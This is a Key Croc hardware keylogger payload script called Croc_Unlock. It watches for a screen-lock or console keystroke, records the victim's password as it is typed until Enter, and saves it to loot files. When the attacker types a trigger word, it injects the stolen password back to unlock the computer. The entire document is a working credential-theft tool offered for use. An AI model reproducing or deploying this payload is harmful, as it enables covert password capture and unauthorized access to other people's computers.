# Title:           Croc_Unlock
# Description:     Save target passwd with SAVEKEYS command by pressing GUI-l or CONTROL-ALT-F3
#                  Log in with typing crocunlock, save at /loot/Croc_Pot/Croc_unlock.txt.filtered and /tools/Croc_Pot/Croc_unlock.txt.filtered
# Author:          Spywill / RootJunky
# Version:         2.0
# Category:        Key Croc

MATCH (crocunlock|GUI-l|CONTROL-ALT-F3)

UNLOCK_TMP="/tmp/unlock_Count.txt"

if [[ -d "/root/udisk/loot/Croc_Pot" && "/root/udisk/tools/Croc_Pot" ]]; then
	LED B
else
	mkdir -p /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
fi

UNLOCK_FILE() {
	until [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; do
		:
	done
	LED G
	Q DELAY 5000
	LED OFF
}

UNLOCK_COUNT() {
	if [ -f ${UNLOCK_TMP} ]; then
		i=$(sed -n 1p ${UNLOCK_TMP})
		echo $(( $i + 1 )) > ${UNLOCK_TMP}
		RELOAD_PAYLOADS
	else
		echo $(( i++ )) > ${UNLOCK_TMP}
		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
			cat /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered >> /root/udisk/loot/Croc_Pot/Croc_unlock.txt.filtered
			rm -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered /root/udisk/tools/Croc_Pot/Croc_unlock.txt
		fi
	fi
	Q DELAY 1000
}

case $LOOT in
	GUI-l)
		UNLOCK_COUNT
		Q KEYCODE 00,00,2c
		if [ "$(sed -n 1p ${UNLOCK_TMP})" -eq "0" ]; then
SAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
			LED ATTACK
			UNLOCK_FILE
		else
			RELOAD_PAYLOADS
			UNLOCK_FILE
		fi
;;
	CONTROL-ALT-F3)
		UNLOCK_COUNT
		if [ "$(sed -n 1p ${UNLOCK_TMP})" -eq "0" ]; then
			if [ -f /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt ]; then
				Q STRING "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
				Q ENTER
				Q DELAY 1000
SAVEKEYS /root/udisk/tools/Croc_Pot/Croc_unlock.txt UNTIL ENTER
				LED ATTACK
				UNLOCK_FILE
			fi
		else
			RELOAD_PAYLOADS
			UNLOCK_FILE
		fi
;;
	crocunlock)
		if [ -f /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered ]; then
			$(sed -i -e 's/'`sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt`'//g' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
			$(sed -i -e 's/crocunlock//g' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
			LED G
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q BACKSPACE
			Q DELAY 1000
			Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"
			Q ENTER
			LED OFF
			RELOAD_PAYLOADS
		else
			LED R
			RELOAD_PAYLOADS
		fi
;;
esac
